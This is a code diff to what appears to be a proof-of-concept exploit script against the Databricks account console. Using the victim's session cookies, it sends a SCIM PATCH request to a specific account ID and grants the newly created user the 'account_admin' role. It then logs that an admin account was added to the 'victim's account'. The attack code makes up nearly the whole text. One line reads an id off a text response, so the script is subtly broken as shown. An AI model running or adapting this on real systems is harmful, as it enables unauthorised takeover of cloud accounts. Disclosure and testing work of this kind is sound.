@@ -33,7 +33,36 @@
     );
 
     const createResponse = await createUser.text();
-    console.log("Response:", createResponse);
+    const id = createResponse.id; 
+    console.log("Created user with id:", id);
+
+    // Step 2: Use the id in a PATCH request
+    const patchBody = {
+      schemas: ["urn:ietf:params:scim:api:messages:2.0:PatchOp"],
+      Operations: [
+        {
+          op: "add",
+          path: "roles",
+          value: [{ value: "account_admin" }]
+        }
+      ]
+    };
+
+    const patchRes = await fetch(`https://accounts.cloud.databricks.com/api/2.1/accounts/d0d2ab75-7d2b-4931-a529-fea42d0e6602/scim/v2/Users/${id}`, {
+      method: "PATCH",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(patchBody)
+    });
+
+    const patchText = await patchRes.text();
+    console.log("PATCH status:", patchRes.status, "body:", patchText);
+
+    if (patchRes.ok) {
+      console.log("Admin account created and added to victim's account!");
+    }
 
   } catch (err) {
     console.error(err);
